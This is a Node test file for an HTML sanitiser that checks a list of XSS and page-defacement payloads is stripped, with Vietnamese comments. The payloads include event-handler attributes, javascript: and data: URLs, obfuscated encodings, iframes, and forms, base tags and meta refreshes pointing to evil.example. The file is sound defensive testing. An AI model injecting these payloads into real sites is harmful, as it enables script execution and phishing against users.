// Ca kiểm payload XSS / phá trang cho src/utils/sanitize-html.ts (việc #401).
// Chạy: npm run test:sanitize (node --test, Node ≥ 23 tự bỏ kiểu TS — không thêm dependency).
// Cùng bộ ca với vgd-next/scripts/sanitize.test.mjs và wildside-vgd/scripts/sanitize.test.mjs:
// đổi mức chặn ở một repo thì đổi ca ở cả ba.
import assert from "node:assert/strict";
import { describe, it } from "node:test";

import { sanitizeHtml } from "../src/utils/sanitize-html.ts";

/** Kết quả không được chứa chuỗi nào trong `deny`. */
const PAYLOADS = [
  { html: '<img src="x" onerror="alert(1)">', deny: ["onerror"] },
  { html: '<details open ontoggle="alert(1)">x</details>', deny: ["ontoggle"] },
  { html: '<a href="javascript:alert(1)">x</a>', deny: ["javascript:"] },
  { html: '<a href="JaVaScRiPt&#58;alert(1)">x</a>', deny: ["javascript", "alert"] },
  { html: '<a href="java&#x09;script:alert(1)">x</a>', deny: ["script:", "alert"] },
  { html: '<a href="vbscript:msgbox(1)">x</a>', deny: ["vbscript"] },
  { html: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>', deny: ["data:"] },
  { html: "<script>alert(1)</script><p>ok</p>", deny: ["<script", "alert"] },
  { html: '<iframe src="https://evil.example"></iframe>', deny: ["<iframe", "evil"] },
  { html: '<iframe srcdoc="<script>alert(1)</script>"></iframe>', deny: ["<iframe", "srcdoc"] },
  { html: '<object data="https://evil.example/x.swf"></object>', deny: ["<object", "evil"] },
  { html: '<embed src="https://evil.example/x.swf">', deny: ["<embed", "evil"] },
  { html: '<svg onload="alert(1)"><circle r="1"/></svg>', deny: ["<svg", "onload"] },
  { html: "<svg><script>alert(1)</script></svg>", deny: ["<svg", "<script"] },
  { html: '<math><mtext><img src="x" onerror="alert(1)"></mtext></math>', deny: ["<math", "onerror"] },
  { html: "<style>body{display:none}</style><p>ok</p>", deny: ["<style", "display"] },
  {
    html: '<form action="https://evil.example"><input name="pw"><textarea></textarea><select><option>a</option></select><button formaction="https://evil.example">Go</button></form>',
    deny: ["<form", "<input", "<textarea", "<select", "<option", "<button", "evil"],
  },
  { html: '<base href="https://evil.example/">', deny: ["<base", "evil"] },
  { html: '<meta http-equiv="refresh" content="0;url=https://evil.example">', deny: ["<meta", "evil"] },
  { html: '<link rel="stylesheet" href="https://evil.example/x.css">', deny: ["<link", "evil"] },
  { html: '<p style="background:url(https://evil.example/t.png)">x</p>', deny: ["url(", "evil"] },
  { html: '<p style="width:expression(alert(1))">x</p>', deny: ["expression", "alert"] },
  { html: '<p style="position:fixed;inset:0;z-index:9999">x</p>', deny: ["position", "z-index"] },
  { html: '<p style="position/**/:fixed;top:0">x</p>', deny: ["position", "fixed"] },
  { html: '<p style="posi\\74 ion:fixed">x</p>', deny: ["fixed"] },
];

describe("sanitizeHtml: payload nguy hiểm bị gỡ", () => {
  for (const { html, deny } of PAYLOADS) {
    it(html, () => {
      const out = sanitizeHtml(html).toLowerCase();
      for (const needle of deny) assert.ok(!out.includes(needle), `còn "${needle}" trong: ${out}`);
    });
  }

  it("rỗng / null → chuỗi rỗng", () => {
    assert.equal(sanitizeHtml(""), "");
    assert.equal(sanitizeHtml(null), "");
    assert.equal(sanitizeHtml(undefined), "");
  });

  it("markup lành giữ nguyên (cả bảng + class do prepareTableHTML gắn)", () => {
    const out = sanitizeHtml(
      '<p><strong>Gậy</strong> <a href="https://x.example/p">xem</a></p><div class="table-scroll overflow-auto my-4"><table class="table-striped"><tbody><tr><td>a</td></tr></tbody></table></div>',
    );
    assert.match(out, /<strong>Gậy<\/strong>/);
    assert.match(out, /<a href="https:\/\/x\.example\/p">xem<\/a>/);
    assert.match(out, /<div class="table-scroll overflow-auto my-4"><table class="table-striped">/);
  });

  it("target bị gỡ ⇒ không tab-nabbing", () => {
    assert.ok(!sanitizeHtml('<a href="https://x.example" target="_blank">x</a>').includes("target"));
  });
});

describe("sanitizeHtml: style chỉ giữ allowlist trình bày chữ", () => {
  it("giữ color/text-align/font-weight, bỏ phần còn lại", () => {
    const out = sanitizeHtml(
      '<p style="color:#c00;text-align:center;font-weight:bold;font-family:Comic Sans;font-size:40px;margin:-500px;background-color:red">x</p>',
    );
    assert.match(out, /style="color: #c00; text-align: center; font-weight: bold"/);
  });

  it("không còn khai báo hợp lệ ⇒ bỏ cả thuộc tính style", () => {
    assert.equal(sanitizeHtml('<p style="display:none">x</p>'), "<p>x</p>");
  });
});
